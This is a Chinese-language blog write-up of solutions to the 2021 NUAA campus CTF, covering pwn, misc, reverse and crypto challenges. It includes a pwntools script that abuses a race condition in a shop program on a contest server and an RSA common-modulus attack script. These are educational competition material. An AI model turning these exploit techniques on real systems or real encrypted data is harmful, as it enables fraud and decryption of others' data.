---
title: 2021年nuaa校赛 WP
tags:
categories:
  - [CTF, WP]
toc: true
mathjax: true
top: false
comments: true
copyright: true
date: 2021-12-11 21:28:09
---

> 官方wp：[链接](https://github.com/Asuri-Team/NUAACTF2021-Challenges/blob/main/WP.md)

# 1 pwn

## 1.1 thread

```cpp
unsigned int __fastcall Sale_Handler(void *a1)
{
  unsigned int result; // eax

  balance += 90 * Size;
  result = sleep(0);
  Size = 0;
  return result;
}
```

生产者-消费者问题，利用`Sale_Handler`函数中的`sleep`函数等待的漏洞，不断执行`Sale_Handler`函数，导致`balance`变量会累加。

执行脚本如下：

```python
##coding=utf8
from pwn import *
## 构造与程序交互的对象
sh = remote('118.195.147.196', 9231)
#sh = process('./thread')
## 构造payload
## 向程序发送字符串
sh.recvuntil('it\n')
sh.sendline('1')
sh.recvuntil('buy?\n')
sh.sendline('10')
sh.sendline('2')
sh.sendline('2')
sh.sendline('2')
sh.sendline('2')
## 将代码交互转换为手工交互
sh.interactive()
```

# 2 Misc

## 2.1 baby_mix

base16-》32-》58-》64

## 2.2 questionnaire

问卷

## 2.3 我们生活在南京（一）——穿越时空的电波

音频倒序，取单词首字母

## 2.4 我们生活在南京（二）——等幅电报？

**AudacityPortable**打开文件，切换成频谱图，

转成摩斯电码：

```cpp
..-. .-.. .- --. -.-. .-- .. ..... ....- - .-. ....- -.. .. - .. ----- -. -- ...-- - .... ----- -..
```

解密

```
FLAGCWI54TR4DITI0NM3TH0D
//转小写
flag{cwi54tr4diti0nm3th0d}
```

# 3 re

## 3.1 IDA Start

IDA打开文件，`alt+t`搜索`flag`

# 4 crypto

## 4.1 checkin

仿射密码，a=11, b=11

* http://www.hiencode.com/affine.html

## 4.2 easyRSA

共模攻击模板题目

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from libnum import n2s, s2n
from gmpy2 import invert, gcdext

n = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929
e1 = 17 #填写e1
e2 = 65537 #填写e2

s = gcdext(e1, e2)
s1 = s[1]
s2 = -s[2]

#读取密文
file1 = open('flag.enc1', 'rb')
c1 = file1.read()
c1 = s2n(c1)#字符串转数字

file2 = open('flag.enc2', 'rb')
c2 = file2.read()
c2 = s2n(c2)#字符串转数字

c2 = invert(c2, n)
m = (pow(c1,s1,n) * pow(c2 , s2 , n)) % n
print (n2s(m))
```
